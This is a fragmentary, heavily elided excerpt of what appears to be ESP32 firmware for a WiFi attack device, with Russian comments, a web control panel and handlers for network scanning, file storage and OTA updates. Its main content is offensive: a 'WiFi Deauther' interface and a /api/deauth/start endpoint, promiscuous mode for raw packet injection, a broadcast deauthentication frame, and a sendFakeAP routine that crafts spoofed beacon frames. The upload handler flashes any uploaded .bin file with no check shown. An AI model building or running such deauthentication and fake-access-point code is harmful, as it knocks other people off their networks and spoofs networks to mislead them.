...
// === FORWARD DECLARATIONS (ИСПРАВЛЕНО) ===
...
<div id="networks" style="margin-top:10px;">No networks scanned</div>
</div>
<div class="card">
<h2>📶 WiFi Deauther</h2>
...
function toggleBLE(){
  bleActive=!bleActive;
  const btn=document.getElementById('bleBtn');  const status=document.getElementById('bleStatus');
  if(bleActive){
...
function refreshFiles(){
  fetch('/api/files').then(r=>r.json()).then(d=>{
    let html='';
    d.files.forEach(f=>{      html+='<div class="file-item"><span>📄 '+f.name+' ('+f.size+'B)</span>';
...
void setup() {
  ...
  // Включаем promiscuous mode для отправки сырых WiFi пакетов
  ...
  server.on("/api/scan", HTTP_GET, handleScan);  server.on("/api/deauth/start", HTTP_GET, handleDeauthStart);
...
void initDeauthFrame() {
  ...
  deauthFrame[4] = 0xFF; deauthFrame[5] = 0xFF;
  deauthFrame[6] = 0xFF; deauthFrame[7] = 0xFF;
  deauthFrame[8] = 0xFF; deauthFrame[9] = 0xFF;
...
void sendFakeAP() {
  ...
  beaconFrame[0] = 0x80; beaconFrame[1] = 0x00;
  beaconFrame[2] = 0x00; beaconFrame[3] = 0x00;
  memset(&beaconFrame[4], 0xFF, 6);
  
  beaconFrame[10] = 0x02; beaconFrame[11] = 0x00;
  beaconFrame[12] = 0x00; beaconFrame[13] = 0x00;
  beaconFrame[14] = 0x00; beaconFrame[15] = 0x00 + apIndex;
  memcpy(&beaconFrame[16], &beaconFrame[10], 6);
  
  uint64_t timestamp = millis() * 1000;
  memcpy(&beaconFrame[24], &timestamp, 8);
  beaconFrame[32] = 0xE8; beaconFrame[33] = 0x03;
  beaconFrame[34] = 0x01; beaconFrame[35] = 0x00;
...
void handleScan() {
  ...
  for (int i = 0; i < scanCount && i < 20; i++) {
    if (i > 0) { json += ","; bssids += ","; rssis += ","; channels += ","; }
    json += "\"" + WiFi.SSID(i) + "\"";
...
void handleUpload() {
  ...
  if (up.status == UPLOAD_FILE_START) {
    if (up.filename.endsWith(".bin")) Update.begin(UPDATE_SIZE_UNKNOWN, U_FLASH);
    else f = LittleFS.open("/" + up.filename, "w");
  } else if (up.status == UPLOAD_FILE_WRITE) {
    if (up.filename.endsWith(".bin")) Update.write(up.buf, up.currentSize);
    else if (f) f.write(up.buf, up.currentSize);  } else if (up.status == UPLOAD_FILE_END) {
    if (up.filename.endsWith(".bin")) { if (Update.end(true)) Serial.println("✅ OTA Success"); }
    else if (f) f.close();
  }
}
...
void handleDeleteFile() {
  ...
  if (LittleFS.remove(file)) { server.send(200, "text/plain", "OK"); }
